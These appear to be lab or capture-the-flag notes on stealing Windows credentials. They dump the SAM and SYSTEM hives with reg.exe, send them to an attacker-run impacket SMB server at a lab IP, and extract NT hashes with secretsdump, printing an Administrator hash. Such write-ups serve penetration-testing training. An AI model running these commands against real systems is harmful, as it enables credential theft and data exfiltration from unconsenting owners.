cleaning up 
`del "C:\Program Files (x86)\System Explorer\System.exe"`
`sc start SystemExplorerHelpService`

in windows the hashes are saved at: `C:\Windows\System32\Config\SAM` but not accessible when computer is running so 

saving the hashes of SAM and System hive 
`reg.exe save HKLM\SAM sam.bak`
`reg.exe save HKLM\SYSTEM system.bak`

![[Screenshot 2021-05-01 at 5.20.42 PM.png]]


to transfer the files using 
`sudo impacket-smbserver share . -smb2support -username sp00f -password Passw0rd!`
![[Screenshot 2021-05-01 at 5.49.14 PM.png]]

and now in the windows box we have to authenticate the user for sharing 

`net use \\10.50.90.103\sp00f /USER:sp00f Passw0rd!`

![[Screenshot 2021-05-01 at 5.49.48 PM.png]]

and using the command `copy * \\10.50.90.103\sp00f` we shared all the files

![[Screenshot 2021-05-01 at 5.52.09 PM.png]]

cleaning up 

![[Screenshot 2021-05-01 at 5.53.26 PM.png]]

### hash cracking

and using impacket only we can crack the hashes using

`impacket-secretsdump -sam sam.bak -system system.bak LOCAL`

![[Screenshot 2021-05-01 at 5.58.21 PM.png]]

```bash
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
```

Admin hash
`Administrator:a05c3c807ceeb48c47252568da284cd2

